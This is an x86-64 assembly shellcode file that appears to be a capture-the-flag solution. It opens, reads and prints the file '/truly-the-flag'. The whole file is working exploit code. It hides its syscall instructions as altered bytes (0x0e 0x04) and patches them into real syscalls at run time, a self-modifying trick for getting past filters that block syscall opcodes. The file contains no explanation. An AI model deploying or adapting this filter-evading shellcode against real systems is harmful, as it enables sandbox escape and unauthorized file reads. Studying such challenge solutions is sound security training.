    BITS 64
    DEFAULT REL

    section .text
    global _start

_start:
    ; shellcode mmap base addr 
    add r9d, 0xdead0000
    
    ; openat
    xor rax, rax
    add rax, 257
    lea rsi, flagpath

    ; syscall
    add qword [r9d + 0x24], 0x1
    add qword [r9d + 0x25], 0x1
    nop  
    db 0x0e, 0x04, 0x90, 0x90
    
    ; set up iovec
    push 0x500
    push rsp
    pop r10
    add r10, 0x10
    push r10

    ; readv
    push rsp
    pop rsi
    xor r10, r10
    push 0x3
    pop rdi
    add rdx, 0x1
    xor rax, rax
    add rax, 19

    ; syscall
    add qword [r9d + 0x56], 0x1
    add qword [r9d + 0x57], 0x1
    nop
    db 0x0e, 0x04, 0x90, 0x90

    ; writev
    xor rax, rax
    add rax, 20
    push 0x1
    pop rdi

    ; syscall
    add qword [r9d + 0x71], 0x1
    add qword [r9d + 0x72], 0x1
    nop
    db 0x0e, 0x04, 0x90, 0x90

    nop
    nop
    nop

flagpath: db "/truly-the-flag", 0